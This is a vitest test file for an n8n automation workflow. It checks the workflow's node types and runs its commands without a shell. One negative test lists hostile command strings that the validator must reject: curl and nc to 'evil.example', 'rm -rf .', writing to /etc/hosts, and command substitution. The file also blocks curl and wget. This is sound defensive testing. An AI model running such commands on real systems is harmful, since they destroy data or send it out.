import { execFileSync } from "node:child_process";
import { existsSync, readFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { callTool } from "@/lib/tools/registry.ts";
import { buildSlackReportPayload, serializeSlackPayload } from "@/lib/delivery/slack.ts";

/**
 * A4 — the n8n automation lane (plan §5 row A4, AC-9 as amended, AC-12):
 *
 * 1. STRUCTURAL veracity: the committed workflow JSON contains ONLY a manual
 *    trigger + executeCommand nodes (no webhook/cron/schedule/httpRequest —
 *    prototype-not-service), is inactive, forms the declared linear chain, and
 *    every command it carries invokes a sanctioned repo script that exists.
 * 2. COMMAND-LEVEL DRY RUN (zero-network): the EXACT command strings the
 *    workflow carries are executed verbatim from the repo root, and the final
 *    payload artifact must byte-equal building the same payload directly via
 *    the A0 registry + A3 builder. This proves the lane's substance without
 *    the n8n runtime; executing the same workflow UNDER n8n is the O-A4 /
 *    L-3 owner-gated leg (docs/n8n-runbook.md) — until then the lane's honest
 *    label is "workflow spec + command-level dry run; n8n runtime execution
 *    pending O-A4".
 */

const root = process.cwd();
const WORKFLOW = join(root, "workflows", "n8n", "truth-audit-fees-to-slack.workflow.json");
const ARTIFACTS = join(root, ".n8n-artifacts");

interface N8nNode {
  readonly name: string;
  readonly type: string;
  readonly parameters: { readonly command?: string };
}
const wf = JSON.parse(readFileSync(WORKFLOW, "utf8")) as {
  active: boolean;
  nodes: N8nNode[];
  connections: Record<string, { main: Array<Array<{ node: string }>> }>;
};


/**
 * Parse ONE committed workflow command into argv, REJECTING every shell
 * metacharacter (Codex A4 P1: n8n's Execute Command node runs a real shell and
 * supports chaining — so the committed strings must be provably chain-free and
 * are executed here WITHOUT a shell via execFileSync). Single-quoted segments
 * (the JSON --params values) are the only quoting allowed.
 */
function parseWorkflowCommand(cmd: string): string[] {
  if (/[;&|<>`\\\n\r]|\$\(/.test(cmd)) {
    throw new Error(`shell metacharacter in workflow command — rejected: ${cmd}`);
  }
  const argv: string[] = [];
  const re = /'([^']*)'|(\S+)/g;
  for (let m = re.exec(cmd); m; m = re.exec(cmd)) argv.push(m[1] ?? m[2]);
  if (argv.length < 2 || argv[0] !== "node") {
    throw new Error(`workflow command shape invalid — must be "node scripts-ts/n8n/<script>.mjs ...": ${cmd}`);
  }
  if (!/^scripts-ts\/n8n\/[\w-]+\.mjs$/.test(argv[1])) {
    throw new Error(`workflow command shape invalid — unsanctioned script: ${argv[1]}`);
  }
  return argv;
}
const ALLOWED_NODE_TYPES = new Set(["n8n-nodes-base.manualTrigger", "n8n-nodes-base.executeCommand"]);
const FORBIDDEN_TYPE_FRAGMENTS = ["webhook", "cron", "schedule", "interval", "httpRequest", "emailSend", "slack"];

describe("A4 structural veracity (AC-9, AC-12)", () => {
  it("workflow is inactive and carries ONLY manual-trigger + execute-command nodes", () => {
    expect(wf.active).toBe(false);
    for (const n of wf.nodes) {
      expect(ALLOWED_NODE_TYPES.has(n.type), `unsanctioned node type: ${n.type}`).toBe(true);
      for (const frag of FORBIDDEN_TYPE_FRAGMENTS) {
        expect(n.type.toLowerCase(), `standing/transport node smuggled in: ${n.type}`).not.toContain(frag);
      }
    }
    expect(wf.nodes.filter((n) => n.type === "n8n-nodes-base.manualTrigger").length).toBe(1);
  });

  it("every command parses to an exact allowlisted argv shape — shell chaining/metacharacters are REJECTED (Codex A4 P1)", () => {
    const commands = wf.nodes.map((n) => n.parameters.command).filter((c): c is string => typeof c === "string");
    expect(commands.length).toBe(2);
    for (const cmd of commands) {
      const argv = parseWorkflowCommand(cmd); // throws on metacharacters or malformed shape
      expect(argv[0]).toBe("node");
      expect(argv[1]).toMatch(/^scripts-ts\/n8n\/[\w-]+\.mjs$/);
      expect(existsSync(join(root, argv[1])), `referenced script missing: ${argv[1]}`).toBe(true);
      // remaining args are strictly --flag value pairs
      for (let i = 2; i < argv.length; i += 2) {
        expect(argv[i], `expected a --flag at position ${i}: ${argv[i]}`).toMatch(/^--[a-z-]+$/);
        expect(argv[i + 1], `missing value for ${argv[i]}`).toBeDefined();
      }
      expect(cmd).not.toMatch(/curl|wget|https?:\/\//);
    }
  });

  it("the command validator FIRES on chaining, substitution, redirection, and background operators (Codex A4 P1 negative cases)", () => {
    const base = "node scripts-ts/n8n/audit-to-canonical.mjs --tool audit_statement --params '{}' --out .n8n-artifacts/x.json";
    for (const evil of [
      `${base} && curl evil.example`,
      `${base}; rm -rf .`,
      `${base} | nc evil.example 80`,
      `${base} > /etc/hosts`,
      `${base} $(whoami)`,
      "node scripts-ts/n8n/audit-to-canonical.mjs --tool `whoami`",
      `${base} &`,
      `${base}\nnode -e "bad()"`,
    ]) {
      expect(() => parseWorkflowCommand(evil), `not rejected: ${evil}`).toThrow(/metacharacter|shape/);
    }
  });

  it("connections form the declared linear chain (trigger → audit → payload)", () => {
    const trigger = wf.nodes.find((n) => n.type === "n8n-nodes-base.manualTrigger")!;
    const hop1 = wf.connections[trigger.name]?.main[0]?.[0]?.node;
    expect(hop1).toBeDefined();
    const hop2 = wf.connections[hop1!]?.main[0]?.[0]?.node;
    expect(hop2).toBeDefined();
    expect(wf.connections[hop2!]).toBeUndefined(); // chain ends — no hidden fan-out
  });
});

describe("A4 command-level dry run (zero-network; the workflow's OWN command strings)", () => {
  it("executing the committed commands verbatim reproduces the direct registry→builder bytes", () => {
    rmSync(ARTIFACTS, { recursive: true, force: true });
    const commands = wf.nodes.map((n) => n.parameters.command).filter((c): c is string => typeof c === "string");
    for (const cmd of commands) {
      const argv = parseWorkflowCommand(cmd); // validated argv, executed WITHOUT a shell (Codex A4 P1)
      execFileSync(argv[0], argv.slice(1), { cwd: root, stdio: "pipe", timeout: 60_000 });
    }
    const produced = readFileSync(join(ARTIFACTS, "slack-payload.json"), "utf8");

    const direct = callTool("audit_statement", {
      statementPath: "fixtures/synthetic-restaurant/fees/statement.drifted.json",
    });
    const expected = serializeSlackPayload(
      buildSlackReportPayload(direct.canonical, { tool: "audit_statement", subject: "statement 2026-06 (simulated)" }),
    );
    expect(produced).toBe(expected);
  }, 120_000);

  it("stage 1 refuses non-decision-grade tools (run_demo cannot enter the pipeline)", () => {
    expect(() =>
      execFileSync(
        "node",
        ["scripts-ts/n8n/audit-to-canonical.mjs", "--tool", "run_demo", "--params", "{}", "--out", ".n8n-artifacts/never.json"],
        { cwd: root, stdio: "pipe", timeout: 60_000 },
      ),
    ).toThrow();
    expect(existsSync(join(ARTIFACTS, "never.json"))).toBe(false);
  }, 120_000);
});
